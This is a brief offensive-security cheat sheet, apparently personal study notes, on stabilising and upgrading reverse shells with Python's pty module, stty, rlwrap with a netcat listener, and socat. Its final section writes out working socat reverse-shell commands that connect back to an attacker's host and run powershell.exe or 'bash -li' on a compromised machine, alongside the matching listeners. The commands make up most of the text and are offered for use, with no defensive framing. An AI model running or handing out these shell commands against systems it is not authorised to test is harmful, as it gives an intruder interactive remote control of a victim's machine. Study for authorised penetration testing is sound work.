# Shell Stabilizing Techniques

## Technique 1: Python

**Step 1: uses Python to spawn a better featured bash. Some versions may used python2 or python3, change if necessary**
```JavaScript
python -c 'import pty;pty.spawn("/bin/bash")'
````

**Step 2: Gives us access to commands such as clear**
```JavaScript
export TERM=xterm
```

**Step 3:**

- Background the shell with CTRL + Z

- In your own terminal, use the command below. This will turn off your own terminal and foregrounds the shell 
```JavaScript
stty raw -echo; fg
```


## Technique 2: rlwrap

**Install rlwrap**
```JavaScript
sudo apt install rlwrap
```

**Usage**
```JavaScript
rlwrap nc -lvnp <port>
```

### Use the third step in technique 1 as the final step for Technique 2


## Technique 3: Socat

* This tecnique is limited to linux machines
* You must also transfer the socat static compiled binary up to the target machine



## Socat Reverse Shells

**Basic Syntax: The following is equivalent to nc -nlvp <port>**
```JavaScript
socat TCP-L:<port> -
```
  
On Windows we would use this command to connect back
```JavaScript
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

This is the equivalent command for a Linux Target
```JavaScript
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```
  

  


